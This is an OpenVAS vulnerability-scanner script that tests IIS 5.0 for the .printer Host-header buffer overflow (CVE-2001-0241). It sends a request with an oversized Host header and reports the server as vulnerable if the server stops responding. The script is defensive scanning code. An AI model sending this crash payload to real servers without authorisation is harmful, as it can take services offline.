# OpenVAS Vulnerability Test
# $Id: iis5_printer.nasl 14336 2019-03-19 14:53:10Z mmartin $
# Description: NT IIS 5.0 Malformed HTTP Printer Request Header Buffer Overflow Vulnerability
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2001 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10657");
  script_version("$Revision: 14336 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 15:53:10 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"IAVA", value:"2001-a-0005");
  script_bugtraq_id(2674);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2001-0241");


  script_name("NT IIS 5.0 Malformed HTTP Printer Request Header Buffer Overflow Vulnerability");


 # Summary

 # Category
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");

 # Dependencie(s)
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("IIS/banner");

 # Family
  script_family("Gain a shell remotely");

 # Copyright
  script_copyright("This script is Copyright (C) 2001 John Lampe");

  script_require_ports("Services/www", 80);
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to the latest version.");
  script_tag(name:"summary", value:"There is a buffer overflow in the remote IIS web server.
  It is possible to overflow the remote Web server and execute commands as the SYSTEM user.

  An attacker may make use of this vulnerability and use it to
  gain access to confidential data and/or escalate their privileges
  on the Web server.");


  exit(0);
}

# The attack starts here

include("http_func.inc");


port = get_http_port(default:80);


sig = get_http_banner(port:port);
if ( sig && "IIS" >!< sig ) exit(0);

if(get_port_state(port)) {
    if(http_is_dead(port:port))exit(0);

    mystring = string("GET /NULL.printer HTTP/1.1\r\n");
    mystring = string (mystring, "Host: ", crap(420), "\r\n\r\n");
    mystring2 = http_get(item:"/", port:port);
    soc = http_open_socket(port);
    if(!soc) {exit(0);}
    else {
      send(socket:soc, data:mystring);
      r = http_recv(socket:soc);
      http_close_socket(soc);

      if(http_is_dead(port:port))
      {
        security_message(port);
        exit(0);
      }
    }
}
